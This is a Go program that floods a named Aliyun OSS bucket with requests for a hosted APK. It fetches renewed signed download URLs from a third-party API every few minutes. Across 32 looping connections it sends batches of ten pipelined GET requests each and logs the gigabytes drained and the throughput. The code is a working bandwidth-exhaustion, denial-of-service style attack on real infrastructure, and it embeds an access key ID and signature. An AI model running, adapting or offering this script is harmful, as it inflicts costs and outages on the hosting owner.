package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"reflect"
	"strings"
	"time"
	"unsafe"
)

const (
	url = "http://uu-apk.oss-cn-shenzhen.aliyuncs.com/storage/apk/2021/0710/10174215smrd.apk?Expires=1628441503&OSSAccessKeyId=LTAI4GKwMp52eDRMbawGVnME&Signature=JYwMnY17HFC7Bv24a0tuzscTQn0%3D"
)

var (
	req    = make([]byte, 0, 10)
	totalC = make(chan int, 10000)
	total  int
	client = http.Client{
		Timeout: time.Second * 2,
	}
)

type (
	DlUrlResp struct {
		Code int    `json:"code"`
		Data string `json:"data"`
	}
)

func getDlUrl() (string, error) {
	resp, err := client.Post("https://w4ci1.mengting.fun:1818/api/apk_down/10828",
		"application/x-www-form-urlencoded", nil)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	bts, _ := io.ReadAll(resp.Body)
	respData := &DlUrlResp{}
	err = json.Unmarshal(bts, respData)
	if err != nil {
		return "", err
	}
	return respData.Data, nil
}
func generateReq(ts int64, ak, sign string) {
	bts := bytes.Buffer{}
	reqStr := fmt.Sprintf("GET /storage/apk/2021/0710/10174215smrd."+
		"apk?Expires=%d&OSSAccessKeyId=%s&Signature"+
		"=%s HTTP/1.1\r\n"+
		"Host: uu-apk.oss-accelerate.aliyuncs.com\r\n\r\n", ts, ak, sign)
	for i := 0; i < 10; i++ {
		bts.WriteString(reqStr)
	}
	req = bts.Bytes()
}
func generateReqByUrl(url string) {
	url = strings.Replace(url, "https://uu-apk.oss-accelerate.aliyuncs.com", "", 1)
	bts := bytes.Buffer{}
	reqStr := fmt.Sprintf("GET %s HTTP/1.1\r\n"+
		"Host: uu-apk.oss-accelerate.aliyuncs.com\r\n\r\n", url)
	for i := 0; i < 10; i++ {
		bts.WriteString(reqStr)
	}
	req = bts.Bytes()
}
func main() {
	dlUrl, err := getDlUrl()
	if err == nil {
		generateReqByUrl(dlUrl)
		log.Println("生成url成功,url:", dlUrl)
	}
	begin := time.Now()
	go func() {
		var length int
		for {
			select {
			case length = <-totalC:
				total += length
			}
		}
	}()

	ticker := time.NewTicker(time.Second * 5)
	renewUrlTicker := time.NewTicker(time.Second*5*60 - 10)
	go func() {
		for {
			<-renewUrlTicker.C
			dlUrl, err := getDlUrl()
			if err == nil {
				generateReqByUrl(dlUrl)
				log.Println("重新生成url成功,url:", dlUrl)
			}
		}
	}()
	go func() {
		var duration time.Duration
		var totalGb, rateMb int
		for {
			<-ticker.C
			duration = time.Since(begin)
			totalGb = total / (1 << 30)
			rateMb = total / int(duration.Seconds()) / (1 << 20)
			log.Printf("当前已运行%v,当前共返回%dGB,每秒%dMB\n", duration, totalGb, rateMb)
		}
	}()
	testUcenter(32)
}
func testUcenter(n int) {
	for i := 0; i < n; i++ {
		go connectUcenter()
	}
	<-time.After(time.Hour)
}
func newConn() (net.Conn, error) {
	return net.Dial("tcp", "uu-apk.oss-cn-shenzhen.aliyuncs.com:80")
}
func connectUcenter() {
	conn, err := newConn()
	if err != nil {
		log.Println("dial failed", err)
	}
	go func() {
		bts := make([]byte, 1024*10)
		for {
			n, err := io.ReadFull(conn, bts)
			if err != nil {
				// log.Println("conn read error:", err)
				// conn.Close()
				conn, err = newConn()
				if err != nil {
					log.Println("read redial failed", err)
				}
			}
			totalC <- n
			// fmt.Println(string(bts))
			// time.Sleep(time.Second / 400)
		}
	}()
	// var m int
	for {
		if conn == nil {
			continue
		}
		_, err := conn.Write(req)
		if err != nil {
			log.Println("conn write error:", err)
			// conn.Close()
			conn, err = newConn()
			if err != nil {
				log.Println("write redial failed", err)
			}
		}
		time.Sleep(time.Second / 20)
	}
}
func str2Bytes(str string) []byte {
	header := (*reflect.SliceHeader)(unsafe.Pointer(&str))
	header.Len = len(str)
	header.Cap = header.Len
	return *(*[]byte)(unsafe.Pointer(header))
}

// post https://w4ci1.mengting.fun:1818/api/apk_down/10828
